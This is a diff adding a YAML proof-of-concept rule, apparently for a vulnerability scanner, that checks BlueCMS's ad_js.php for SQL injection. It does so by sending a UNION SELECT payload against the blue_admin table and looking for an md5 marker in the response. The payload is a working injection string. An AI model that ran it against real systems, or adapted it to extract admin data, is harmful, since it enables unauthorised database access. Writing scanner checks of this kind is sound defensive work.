@@ -1,0 +1,12 @@
+name: poc-yaml-bluecms-sqli
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /ad_js.php?ad_id=1 and 1=2 union select 1,2,3,4,5,6,concat(1,(md5(rand)),1) from blue_admin where admin_id=1  -- a
+    expression: |
+      response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: Facker007(https://github.com/Facker007)
+  links:
+    - https://www.cnblogs.com/Hi-blog/p/7990894.html
